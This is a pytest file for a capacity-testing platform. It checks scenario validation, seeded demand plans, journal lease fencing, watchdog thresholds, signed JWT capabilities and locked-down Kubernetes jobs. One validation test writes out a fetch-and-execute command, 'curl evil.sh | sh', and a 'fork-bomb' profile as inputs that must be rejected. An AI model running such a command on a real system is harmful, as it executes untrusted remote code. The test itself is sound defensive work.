"""S05 scenario contract tests (S05-TEST-001/002/007/008, journal fencing, capabilities)."""

import time
from datetime import timedelta
from pathlib import Path

import jwt
import pytest
from pydantic import ValidationError

from capacity_platform.scenarios import capability
from capacity_platform.scenarios.demand import build_plan
from capacity_platform.scenarios.journal import Journal
from capacity_platform.scenarios.runner import driver_job
from capacity_platform.scenarios.schema import ExperimentScenario, load_scenario
from capacity_platform.watchdog.main import evaluate

ROOT = Path(__file__).resolve().parents[2]
E02 = ROOT / "configs" / "scenarios" / "e02-latency-guardrail.yaml"


def test_same_seed_gives_identical_planned_schedule():
    scenario = load_scenario(E02)
    a, b = build_plan(scenario), build_plan(scenario)
    assert a.planDigest == b.planDigest
    assert [x.offsetMs for x in a.actions[1].arrivals] == [x.offsetMs for x in b.actions[1].arrivals]
    assert build_plan(scenario, seed_override=7).planDigest != a.planDigest


def test_named_streams_isolate_actions_from_each_other():
    scenario = load_scenario(E02)
    raw = scenario.model_dump()
    raw["spec"]["phases"][2]["actions"][0]["requestsPerSecond"] = 30  # change only the heavy phase
    changed = ExperimentScenario.model_validate(raw)
    base, alt = build_plan(scenario), build_plan(changed)
    assert [a.offsetMs for a in base.actions[1].arrivals] == [a.offsetMs for a in alt.actions[1].arrivals]


def test_planned_rate_matches_declared_rate_approximately():
    plan = build_plan(load_scenario(E02))
    baseline = plan.actions[1]  # 15 rps for 120 s
    assert 1500 < len(baseline.arrivals) < 2100


@pytest.mark.parametrize(
    "mutate",
    [
        lambda s: s["spec"]["execution"].update(maxDurationSeconds=100000),  # unbounded duration
        lambda s: s["spec"]["phases"][1]["actions"][0].update(requestsPerSecond=500),  # rate above hard cap
        lambda s: s["spec"]["phases"][1]["actions"][0].update(target="w09-unknown"),  # unknown target
        lambda s: s["spec"]["phases"][1]["actions"][0].update(command="curl evil.sh | sh"),  # arbitrary command
        lambda s: s["spec"].update(faults=["F09"]),  # deferred fault
        lambda s: s["spec"]["phases"][1]["actions"][0].update(profile="fork-bomb"),  # unallowlisted profile
    ],
)
def test_invalid_or_unsafe_scenarios_are_rejected(mutate):
    raw = load_scenario(E02).model_dump()
    mutate(raw)
    with pytest.raises((ValidationError, ValueError)):
        ExperimentScenario.model_validate(raw)


def test_measured_phase_after_cooldown_is_rejected():
    raw = load_scenario(E02).model_dump()
    raw["spec"]["phases"].append({**raw["spec"]["phases"][1], "id": "late"})
    with pytest.raises(ValidationError):
        ExperimentScenario.model_validate(raw)


def test_journal_transitions_and_idempotent_abort(tmp_path):
    j = Journal(tmp_path / "j.sqlite")
    run = j.create_run("s", 1, "d", "p", 1, "moderate")
    j.move(run, "Validating", "ok")
    with pytest.raises(ValueError):
        j.move(run, "Completed", "skip ahead")
    j.request_abort(run, "first")
    j.request_abort(run, "second")
    assert j.abort_requested(run) == "first"


def test_exclusive_lease_fencing(tmp_path):
    j = Journal(tmp_path / "j.sqlite")
    gen = j.acquire("exclusive", "run-a", ttl=timedelta(seconds=60))
    assert gen == 1 and j.acquire("exclusive", "run-b") is None
    assert j.heartbeat("exclusive", "run-a", gen)
    j.db.execute("UPDATE lease SET expires_at = '2000-01-01T00:00:00+00:00'")
    gen_b = j.acquire("exclusive", "run-b")
    assert gen_b == 2
    assert not j.heartbeat("exclusive", "run-a", gen)  # the old owner learns it lost the lease


def test_dead_watchdog_fails_closed(tmp_path):
    j = Journal(tmp_path / "j.sqlite")
    assert j.watchdog_status() == "dead"
    j.watchdog_beat("ok", {})
    assert j.watchdog_status() == "ok"


@pytest.mark.parametrize(
    ("available", "exclusive", "state"),
    [
        (8.0, False, "ok"),
        (8.0, True, "exclusive"),
        (1.8, False, "pressure"),
        (1.2, True, "abort"),
        (None, False, "unknown"),
    ],
)
def test_watchdog_thresholds(available, exclusive, state):
    assert evaluate(available, exclusive) == state


def test_capability_is_scoped_short_lived_and_unforgeable(tmp_path):
    priv, pub = tmp_path / "k.pem", tmp_path / "k.pub"
    capability.generate_keypair(priv, pub)
    token, _ = capability.issue(priv, "run-1", ["w01-latency-api"], ttl_seconds=60)
    assert capability.verify(token, pub.read_bytes(), "w01-latency-api", "compute")["experimentRunId"] == "run-1"
    with pytest.raises(PermissionError):
        capability.verify(token, pub.read_bytes(), "w03-memory-profile", "profile.start")
    other_priv, other_pub = tmp_path / "o.pem", tmp_path / "o.pub"
    capability.generate_keypair(other_priv, other_pub)
    forged, _ = capability.issue(other_priv, "run-1", ["w01-latency-api"], ttl_seconds=60)
    with pytest.raises(jwt.InvalidSignatureError):
        capability.verify(forged, pub.read_bytes(), "w01-latency-api", "compute")
    with pytest.raises(ValueError):
        capability.issue(priv, "run-1", ["w01-latency-api"], ttl_seconds=86400)


def test_expired_capability_is_rejected(tmp_path):
    priv, pub = tmp_path / "k.pem", tmp_path / "k.pub"
    capability.generate_keypair(priv, pub)
    now = int(time.time())
    token = jwt.encode(
        {
            "iss": capability.ISSUER,
            "aud": capability.AUDIENCE,
            "iat": now - 100,
            "exp": now - 10,
            "jti": "x",
            "allowedWorkloads": ["w01-latency-api"],
            "allowedActions": ["compute"],
        },
        priv.read_bytes(),
        algorithm="ES256",
    )
    with pytest.raises(jwt.ExpiredSignatureError):
        capability.verify(token, pub.read_bytes(), "w01-latency-api", "compute")


def test_driver_job_is_tokenless_restricted_and_experiment_pinned():
    job = driver_job(
        "run-20261120-abcdef", "registry.local/driver@sha256:" + "a" * 64, "plan-x", "cap-x", load_scenario(E02), 600
    )
    pod = job["spec"]["template"]["spec"]
    assert pod["automountServiceAccountToken"] is False
    assert pod["nodeSelector"] == {"capacity.lab/pool": "experiment"} and "tolerations" not in pod
    c = pod["containers"][0]
    assert c["securityContext"]["readOnlyRootFilesystem"] and c["securityContext"]["capabilities"]["drop"] == ["ALL"]
    assert c["resources"]["limits"] and job["spec"]["activeDeadlineSeconds"] == 600


# ------------------------------------------------------------------ W05/W06 batch actions
def _with_batch(profile: str) -> dict:
    raw = load_scenario(E02).model_dump()
    raw["spec"]["targets"].append(
        {"workloadId": "w06-opportunistic-batch", "profileRevision": 1, "namespace": "workloads-batch"}
    )
    raw["spec"]["phases"][1]["actions"].append(
        {"kind": "batchJob", "target": "w06-opportunistic-batch", "profile": profile, "expectedUnschedulable": True}
    )
    return raw


def test_batch_action_accepts_only_profiles_the_batch_program_knows():
    assert ExperimentScenario.model_validate(_with_batch("batch-long"))
    with pytest.raises((ValidationError, ValueError)):
        ExperimentScenario.model_validate(_with_batch("analytics-large"))  # W05 profile on W06


def test_batch_job_changes_only_profile_and_seed_of_the_installed_template():
    from capacity_platform.lab.manifests import _batch_spec
    from capacity_platform.scenarios.runner import batch_job
    from capacity_platform.scenarios.schema import JobAction

    template = _batch_spec("w06-opportunistic-batch", "localhost:5001/workload-python@sha256:" + "a" * 64)
    job = batch_job(
        "run-0123456789abcdef",
        template,
        JobAction(kind="batchJob", target="w06-opportunistic-batch", profile="batch-long"),
        99,
        0,
    )
    container, original = (
        job["spec"]["template"]["spec"]["containers"][0],
        template["template"]["spec"]["containers"][0],
    )
    env = {e["name"]: e["value"] for e in container["env"]}
    assert env["RUN_PROFILE"] == "batch-long" and env["RUN_SEED"] == "99"
    assert (container["image"], container["resources"]) == (original["image"], original["resources"])
    assert job["spec"]["template"]["spec"]["serviceAccountName"] == "w06-sa"
    assert {e["name"]: e["value"] for e in original["env"]}["RUN_PROFILE"] == "batch-short"  # template untouched


def test_serial_preflight_ignores_the_run_being_checked_but_not_other_open_runs(tmp_path):
    from types import SimpleNamespace

    from capacity_platform.scenarios.runner import PreflightRefused, ScenarioRunner

    class _Kube:  # just enough of the Kubernetes client for preflight
        def read_namespaced_deployment(self, name, namespace):
            return SimpleNamespace(
                metadata=SimpleNamespace(uid="u1", resource_version="1"), status=SimpleNamespace(ready_replicas=1)
            )

        def list_namespaced_resource_quota(self, namespace):
            return SimpleNamespace(items=[])

    journal = Journal(tmp_path / "journal.sqlite")
    journal.watchdog_beat("ok", {})
    runner = ScenarioRunner(journal, tmp_path, tmp_path / "key.pem", "img", kube=(_Kube(), None, _Kube()))
    scenario = load_scenario(E02)  # executionClass: moderate (serial)
    current = journal.create_run(scenario.metadata.id, 1, "d", "p", 1, "moderate")
    assert runner.preflight(scenario, current)["checks"]["watchdog"] == "ok"
    journal.create_run(scenario.metadata.id, 1, "d", "p", 2, "moderate")  # a second open run
    with pytest.raises(PreflightRefused):
        runner.preflight(scenario, current)


@pytest.mark.parametrize(
    ("counts", "drop", "expected"),
    [
        (
            {"completed": 100, "response_success": 100},
            {"numerator": 0, "denominator": 100},
            "passed_pending_evaluation",
        ),
        ({"completed": 5050, "response_error": 5050}, {"numerator": 0, "denominator": 5050}, "invalid"),  # all 401s
        (
            {"completed": 100, "response_success": 100},
            {"numerator": 20, "denominator": 120},
            "invalid",
        ),  # load not delivered
        ({}, {}, "invalid"),
    ],
)
def test_run_quality_never_reports_undelivered_or_failed_load_as_a_result(counts, drop, expected):
    from capacity_platform.scenarios.runner import classify_run

    assert classify_run({"counts": counts, "dropFraction": drop})["outcome"] == expected
